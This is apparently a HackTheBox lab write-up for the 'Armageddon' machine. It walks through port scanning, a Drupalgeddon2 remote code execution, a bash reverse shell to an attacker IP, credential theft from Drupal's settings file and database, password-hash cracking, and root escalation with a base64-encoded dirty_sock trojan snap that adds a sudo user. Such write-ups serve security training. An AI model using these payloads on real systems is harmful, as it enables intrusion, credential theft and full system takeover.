---
title: "Armageddon"
date: 2021-07-24 21:37:00 +0530
categories: [HackTheBox, Linux Machines]
tags: [drupal, mysql, snap, linux, hackthebox]
image: /assets/img/Posts/Armageddon/Armageddon.png
---
# Masscan + Nmap
```bash
$ masscan -p1-65535,U:1-65535 10.10.10.233 --rate=10000 -e tun0 | tee masscan.out

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2021-07-03 11:03:35 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.233
Discovered open port 80/tcp on 10.10.10.233
```
Parse those ports to nmap:
```bash
$ ports=$(cat masscan.out |awk '{ print $4 }' | sed 's/\/tcp//' | tr '\n' ',' | sed 's/,$//')
$ nmap -sVC  --min-rate 1000 -p $ports 10.10.10.233 -oN nmap-fullscan.out
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-03 16:34 IST
Nmap scan report for 10.10.10.233
Host is up (0.088s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon
```
# HTTP (Port-80)
- Greets with a message "Welcome to Armageddon" and a login page.

![armageddon-1.png](/assets/img/Posts/Armageddon/armageddon-1.png)

- Source code to the home page reveals Drupal 7 running.
	```html
	<meta name="Generator" content="Drupal 7 (http://drupal.org)" />
	``` 
	`/CHANGELOG.txt` shows version as `Drupal 7.56`.
- There are some files in robots.txt file which do not contain much sensitive information. 
# Foothold
Finding exploits for Drupal 7 gives:
```bash
$ searchsploit drupal 7.56
--------------------------------------------------------------------------------------------- ------------------------
 Exploit Title                                                                               |  Path
--------------------------------------------------------------------------------------------- ------------------------
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                     | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                  | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution          | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)      | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)             | php/webapps/44448.py
Drupal < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)   | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                               | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution                                           | php/webapps/46459.py
----------------------------- ----------------------------------------------------------------------------------------
Shellcodes: No Results
```
Here's a exploit for Drupal 7.x for Drupalgeddon 2 Forms API Property Injection: https://github.com/FireFart/CVE-2018-7600
```bash
$ python poc.py
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
[{"command":"settings","settings":{"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"XlrWqA3Z7R7kRCGdc5hw-K6Ss48UaX4u6gO2Rr1XWm8"}},"merge":true},{"command":"insert","method":"replaceWith","selector":null,"data":"","settings":{"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"XlrWqA3Z7R7kRCGdc5hw-K6Ss48UaX4u6gO2Rr1XWm8"}}}]
```
Using a bash reverse shell payload : ``bash -i >& /dev/tcp/10.10.14.25/4444 0>&1`` we get a rev-shell.
```bash
$ rlwrap nc -lnp 4444
Connection received on 10.10.10.233 34874
bash: no job control in this shell

bash-4.2$ whoami
apache
```
## MySQL 
```bash
bash-4.2$ cat /var/www/html/sites/default/settings.php
							[..snip..]
$databases = array (
  'default' =>
  array (
    'default' =>
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
							[..snip..]
```
Dumping MySQL database and getting username and password:
```bash
bash-4.2$ mysql -u drupaluser -p'CQHEy@9M*m23gBVj' -e 'show databases;'
Database
information_schema
drupal
mysql
performance_schema

bash-4.2$ mysql -u drupaluser -p'CQHEy@9M*m23gBVj' -e 'use drupal; show tables;'
Tables_in_drupal
actions
authmap
batch
block
[..snip..]
users
users_roles
variable
watchdog

bash-4.2$ mysql -u drupaluser -p'CQHEy@9M*m23gBVj' -e 'select name,pass from drupal.users;'
name    pass

brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
test    $S$DXHwkzIHfP.u9NPIUSeKhG/D4ICsQQVai1wZCSNGWsyqnzuXXHOZ
htb     $S$DX3/RE6IlgxLBA32tTpcbBh7DIf32hnOKEzTPql47523uOG3gIT0
```
Hash cracking with john gives ``brucetherealadmin:booboo`` as credentials:
```bash
# john hashes -w:/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Drupal7, $S$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
booboo           (?)
1g 0:00:00:00 DONE (2021-07-03 17:41) 9.090g/s 72.72p/s 72.72c/s 72.72C/s booboo..honey
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
We can login via SSH onto the box:
```bash
$ ssh brucetherealadmin@10.10.10.233
The authenticity of host '10.10.10.233 (10.10.10.233)' can't be established.
ECDSA key fingerprint is SHA256:bC1R/FE5sI72ndY92lFyZQt4g1VJoSNKOeAkuuRr4Ao.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.233' (ECDSA) to the list of known hosts.
brucetherealadmin@10.10.10.233's password:
Last login: Sat Jul  3 12:55:51 2021 from 10.10.14.57
[brucetherealadmin@armageddon ~]$
```
# Privesc
Checking for any sudo permissions available:
```bash
[brucetherealadmin@armageddon ~]$ sudo -l
Matching Defaults entries for brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset,
    env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME
    LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE
    LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```
Which means we can install any .snap file as root.
Googling _"Create malicious snap github"_ gives: https://github.com/initstring/dirty_sock

>_"Ubuntu comes with snapd by default, but any distribution should be exploitable if they have this package installed. You can easily check if your system is vulnerable. Run the command below. If your snapd is 2.37.1 or newer, you are safe."_

Since Dirty Sock v2 works locally we can focus on that: https://raw.githubusercontent.com/initstring/dirty_sock/master/dirty_sockv2.py

## Creating malicious snap
dirty_sockv2.py has a variable called TROJAN_SNAP which stores the malicious snap.

> _"The following global is a base64 encoded string representing an installable snap package. The snap itself is empty and has no functionality. It does, however, have a bash-script in the install hook that will create a new user."_

```bash
[brucetherealadmin@armageddon ~]$ python3 -c "print('aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw'+ 'A' * 4256 + '==')" | base64 -d > mal.snap
```

Running with sudo gives error related to metatdata:
```bash
[brucetherealadmin@armageddon ~]$ sudo /usr/bin/snap install mal.snap
error: cannot find signatures with metadata for snap "mal.snap"
```

Viewing metadata shows the confinement is `devmode` , and after the payload runs it creates a user:`dirty_sock` password:`dirty_sock`, adds it to `sudo` group and gives all perms to `dirty_sock` user in /etc/sudoers.
```bash
strings mal.snap
hsqs
#!/bin/bash
useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s /bin/bash
usermod -aG sudo dirty_sock
echo "dirty_sock    ALL=(ALL:ALL) ALL" >> /etc/sudoers
name: dirty-sock
version: '0.1'
summary: Empty snap, used for exploit
description: 'See https://github.com/initstring/dirty_sock
architectures:
- amd64
confinement: devmode
grade: devel
7zXZ
7zXZ
        $l5
```

Running snap with --devmode flag:
```bash
[brucetherealadmin@armageddon ~]$ sudo /usr/bin/snap install malicious.snap --devmode
dirty-sock 0.1 installed
```

Get root:
```bash
[brucetherealadmin@armageddon ~]$ sudo snap install mal.snap --devmode
dirty-sock 0.1 installed
[brucetherealadmin@armageddon ~]$ su dirty_sock
Password:
[dirty_sock@armageddon brucetherealadmin]$ sudo su

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for dirty_sock:
[root@armageddon brucetherealadmin]# whoami && hostname
root
armageddon.htb
```
